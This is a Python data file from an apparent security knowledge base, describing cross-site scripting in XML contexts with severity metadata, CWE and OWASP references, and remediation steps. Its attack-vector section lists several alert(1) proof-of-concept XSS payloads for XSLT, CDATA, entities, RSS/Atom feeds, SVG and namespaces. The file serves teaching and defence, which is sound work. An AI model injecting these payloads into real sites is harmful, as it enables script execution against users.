#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: XML Context XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in XML Context",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79", "CWE-91", "CWE-611"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "xml", "xslt", "xxe", "soap", "rss", "atom", "svg"],
    "description": """
XML context XSS occurs when user input is embedded in XML documents that are later rendered
by browsers or processed by XSLT. Includes RSS feeds, SOAP responses, SVG, and custom XML.

SEVERITY: HIGH
XML is processed by multiple parsers. XSLT can execute JavaScript.
Often combined with XXE for more severe attacks.
""",
    "attack_vector": """
XSLT SCRIPT EXECUTION:
<xsl:stylesheet>
  <xsl:template match="/">
    <script>alert(1)</script>
  </xsl:template>
</xsl:stylesheet>

CDATA BYPASS:
<![CDATA[<script>alert(1)</script>]]>

XML ENTITY INJECTION:
<!DOCTYPE foo [<!ENTITY xxs "<script>alert(1)</script>">]>
<root>&xxs;</root>

RSS FEED XSS:
<item><title><![CDATA[<script>alert(1)</script>]]></title></item>

ATOM FEED XSS:
<content type="html">&lt;script&gt;alert(1)&lt;/script&gt;</content>

SVG EMBEDDED:
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>

PROCESSING INSTRUCTION:
<?xml-stylesheet href="javascript:alert(1)"?>

NAMESPACE CONFUSION:
<html:script xmlns:html="http://www.w3.org/1999/xhtml">alert(1)</html:script>
""",
    "remediation": """
DEFENSE:

1. SANITIZE user input before XML embedding
2. Escape XML special characters: < > & " '
3. Disable external entities (XXE prevention)
4. Use safe XML parsers with DTD disabled
5. Set Content-Type: application/xml (not text/html)
6. Validate XML schema
7. Implement CSP headers

XML ENCODING:
< → &lt;
> → &gt;
& → &amp;
" → &quot;
' → &apos;

PARSER CONFIG (Python):
from defusedxml import ElementTree  # Safe parser

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CWE-611: XXE
- XML External Entity Prevention
""",
}
